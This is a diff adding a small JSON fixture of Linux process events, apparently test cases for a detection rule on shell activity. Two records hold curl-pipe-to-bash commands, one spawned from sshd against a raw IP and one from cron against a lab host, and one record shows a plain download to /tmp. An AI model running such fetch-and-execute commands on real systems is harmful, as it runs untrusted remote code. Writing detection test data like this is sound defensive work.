@@ -1,0 +1,26 @@
+[
+  {
+    "category": "linux_process",
+    "fields": {
+      "Image": "/bin/bash",
+      "ParentImage": "/usr/sbin/sshd",
+      "CommandLine": "bash -c \"curl -s http://198.51.100.10/install.sh | bash\""
+    }
+  },
+  {
+    "category": "linux_process",
+    "fields": {
+      "Image": "/usr/bin/curl",
+      "ParentImage": "/bin/bash",
+      "CommandLine": "curl -sSL -o /tmp/install.sh https://example.org/install.sh"
+    }
+  },
+  {
+    "category": "linux_process",
+    "fields": {
+      "Image": "/bin/bash",
+      "ParentImage": "/usr/sbin/cron",
+      "CommandLine": "bash -c \"curl -s https://packages.lab.internal/install.sh | bash\""
+    }
+  }
+]
